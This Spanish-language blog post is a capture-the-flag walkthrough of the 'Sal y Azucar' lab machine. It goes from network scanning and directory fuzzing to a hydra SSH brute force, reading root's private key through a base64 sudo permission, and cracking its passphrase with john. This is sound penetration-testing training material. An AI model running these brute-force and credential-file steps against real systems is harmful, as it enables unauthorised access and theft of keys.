---
layout: post
title: "Sal y Azucar"
date: 2024-06-14 10:55:23
category: hackerlabs
vm: hackerlabs
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/thehackerlabs/thehackerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Sal y Azucar </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Dificultad:</strong> <span class="easy">Facil</span></td> </tr>
  <tr> <td><strong><a href="https://thehackerslabs.com/sal-y-azucar/" target="_blank"> Descarga</a></strong></td> </tr>
</table>

<br>

![img](/notas/public/img/thehackerlabs/SalyAzucar/host.png){:.margin}

**1\.** Escaneo dispositivos en la red.

`sudo arp-scan -I enp2s0 --localnet`

![img](/notas/public/img/thehackerlabs/SalyAzucar/arp.png){:.margin}

**2\.** Escaneo puertos y servicios en la maquina.

`sudo nmpa -p- --open -n -Pn -sCV --min-rate=5000 -T5 192.168.1.6`

![img](/notas/public/img/thehackerlabs/SalyAzucar/nmap.png){:.margin}

**3\.** En la web tenemos el apache por defecto.

`http://192.168.1.6`

![img](/notas/public/img/thehackerlabs/SalyAzucar/80.png){:.margin}

**4\.** Hago fuzzing de directorios y archivos.

`gobuster dir -u http://192.168.1.6/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt -q`

![img](/notas/public/img/thehackerlabs/SalyAzucar/gobuster.png){:.margin}

**5\.** Dentro de summary encuentro un html, este me da un mensaje.

`http://192.168.1.6/summary/summary.html`

![img](/notas/public/img/thehackerlabs/SalyAzucar/summary.png){:.margin}

**6\.** Tras no tener mas nada, hago bruteforce al ssh tanto al usuario como la contraseña.

`hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /user/share/wordlists/rockyou.txt ssh://192.168.1.6`

![img](/notas/public/img/thehackerlabs/SalyAzucar/hydra.png){:.margin}

**7\.** Accedo por el ssh.

`ssh info@192.168.1.6`

![img](/notas/public/img/thehackerlabs/SalyAzucar/ssh.png){:.margin}

**8\.** Revisando los permisos sudo.

`sudo -l`

![img](/notas/public/img/thehackerlabs/SalyAzucar/sudol.png){:.margin}

**9\.** Ya que podemos ejecutarlo como root, encodeo y decodeo el id_rsa de root.

`sudo base64 /root/.ssh/id_rsa | base64 -d`

![img](/notas/public/img/thehackerlabs/SalyAzucar/base64.png){:.margin}

**10\.** Crackeando un passphrase del id_rsa de root.

_10.1- Lo guardo en un archivo_

`nano id_rsa`

![img](/notas/public/img/thehackerlabs/SalyAzucar/idrsa.png){:.margin}

_10.2- Usando john para encontrar el passphrase_

`ssh2john id_rsa > key`

`john --wordlist=/usr/share/wordlists/rockyou.txt key`

![img](/notas/public/img/thehackerlabs/SalyAzucar/john.png){:.margin}

**11\.** Obteniendo el super usuario.

_11.1- Le doy los permisos pertinentes la idrsa_

`chmod 600 id_rsa`

![img](/notas/public/img/thehackerlabs/SalyAzucar/chmodidrsa.png){:.margin}

_11.2- Accediendo por ssh_

`ssh -i id_rsa root@192.168.1.6`

![img](/notas/public/img/thehackerlabs/SalyAzucar/root.png){:.margin}

<br>

<a href="#">_Finalizado._</a>